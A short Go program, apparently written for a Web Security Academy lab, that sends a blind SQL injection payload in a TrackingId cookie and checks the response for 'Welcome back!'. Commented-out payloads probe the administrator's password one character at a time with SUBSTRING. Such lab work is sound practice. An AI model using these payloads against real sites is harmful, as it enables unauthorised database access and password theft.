package main

import (
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

func main() {

	url := "https://0ade009a044130cec2687aa0001600b5.web-security-academy.net/"

	req, err := http.NewRequest("GET", url, nil)

	if err != nil {
		return
	}

	//var cookieValue string = "jGx93SMaBL5SzgG4' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s"

	// var cookieValue string = "jGx93SMaBL5SzgG4' AND '1'='1"

	//fmt.Println("jGx93SMaBL5SzgG4" + condition)

	//const trackingId = "jGx93SMaBL5SzgG4'+AND+('1')<'s"
	//const trackingId = "jGx93SMaBL5SzgG4'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)<'s"

	//const trackingId = "jGx93SMaBL5SzgG4'+AND+SUBSTRING('saaaaaaaaaaaaaaaa',1,1)='s"
	const trackingId = "jGx93SMaBL5SzgG4'+AND+SUBSTRING('security',1,1)='s"

	//const session = "8dmHftuaNbESHpu3UNpwKWA8jCP7a0J8"

	req.AddCookie(&http.Cookie{Name: "TrackingId", Value: trackingId})
	//req.AddCookie(&http.Cookie{Name: "session", Value: session})
	// req.AddCookie(&http.Cookie{Name: "csrftoken", Value: csrftoken})

	fmt.Println(req.Cookie("TrackingId"))

	client := &http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(url +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return
	}

	b, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		panic(err)
	}
	println(strings.Contains(string(b), "Welcome back!"))

	//println(string(b))

	for c := 'a'; c <= 'z'; c++ {
		fmt.Printf("%c\n", c)
	}
}
